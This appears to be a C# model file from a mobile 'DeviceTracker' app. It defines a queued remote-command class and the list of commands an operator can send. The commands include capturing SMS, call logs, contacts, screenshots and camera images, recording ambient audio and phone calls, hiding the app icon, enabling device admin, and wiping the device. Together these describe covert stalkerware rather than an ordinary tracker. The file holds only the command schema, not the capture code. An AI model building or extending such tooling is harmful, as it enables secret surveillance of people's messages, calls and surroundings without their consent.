using Newtonsoft.Json;
using SQLite;

namespace DeviceTracker.Models.Command;

[Table("pending_commands")]
public class RemoteCommand
{
    [PrimaryKey, JsonIgnore] public string Id { get; set; } = Guid.NewGuid().ToString();
    [JsonProperty("command")] public string Command { get; set; } = string.Empty;
    [JsonProperty("parameters")] public string ParametersJson { get; set; } = "{}";
    [JsonProperty("sent_at")] public DateTime SentAt { get; set; }
    [JsonIgnore] public DateTime ReceivedAt { get; set; } = DateTime.UtcNow;
    [JsonIgnore] public bool IsProcessed { get; set; }

    [Ignore]
    public Dictionary<string, object>? Parameters
    {
        get => JsonConvert.DeserializeObject<Dictionary<string, object>>(ParametersJson);
        set => ParametersJson = JsonConvert.SerializeObject(value ?? new Dictionary<string, object>());
    }
}

/// <summary>
/// أنواع الأوامر المدعومة
/// </summary>
public static class CommandTypes
{
    public const string SyncNow = "sync_now";
    public const string CaptureLocation = "capture_location";
    public const string CaptureCallLogs = "capture_call_logs";
    public const string CaptureSms = "capture_sms";
    public const string CaptureContacts = "capture_contacts";
    public const string CaptureApps = "capture_apps";
    public const string CaptureScreenshot = "capture_screenshot";
    public const string CaptureCamera = "capture_camera";
    public const string RecordAmbient = "record_ambient";
    public const string RecordCall = "record_call";
    public const string LockDevice = "lock_device";
    public const string WipeDevice = "wipe_device";
    public const string HideApp = "hide_app";
    public const string UnhideApp = "unhide_app";
    public const string EnableAdmin = "enable_admin";
    public const string DisableAdmin = "disable_admin";
    public const string PlaySound = "play_sound";
    public const string SendAlert = "send_alert";
    public const string UpdateInterval = "update_interval";
    public const string RestartService = "restart_service";
    public const string Uninstall = "uninstall";
    public const string CaptureAll = "capture_all";

    public static readonly HashSet<string> All = new()
    {
        SyncNow, CaptureLocation, CaptureCallLogs, CaptureSms, CaptureContacts,
        CaptureApps, CaptureScreenshot, CaptureCamera, RecordAmbient, RecordCall,
        LockDevice, WipeDevice, HideApp, UnhideApp, EnableAdmin, DisableAdmin,
        PlaySound, SendAlert, UpdateInterval, RestartService, Uninstall, CaptureAll
    };
}
